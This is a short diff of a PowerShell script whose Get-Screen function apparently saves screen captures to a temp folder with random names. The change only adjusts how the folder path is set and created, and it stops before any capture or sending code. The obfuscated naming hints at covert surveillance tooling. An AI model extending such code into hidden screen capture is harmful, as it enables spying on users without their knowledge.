@@ -1,13 +1,15 @@
-mkdir "$env:temp\AbLtcVKTqN"
+$save_path =  "$env:temp\AbLtcVKTqN"
 Function  Get-Screen
 {
     param
     (
-        [String] $Path  = "$env:temp\AbLtcVKTqN",
+        [String] $Path  = $save_path,
         [String] $FileName  = "RYTcCvgKPsEd" ,
         [Int] $ScreenNumber  = 0
     )
- 
+    
+    if (-not (Test-Path -Path $save_path)){mkdir $save_path}
+    
     [void] [Reflection.Assembly]::LoadWithPartialName("System.Windows.Forms")
     [void] [Reflection.Assembly]::LoadWithPartialName("System.Drawing")
  
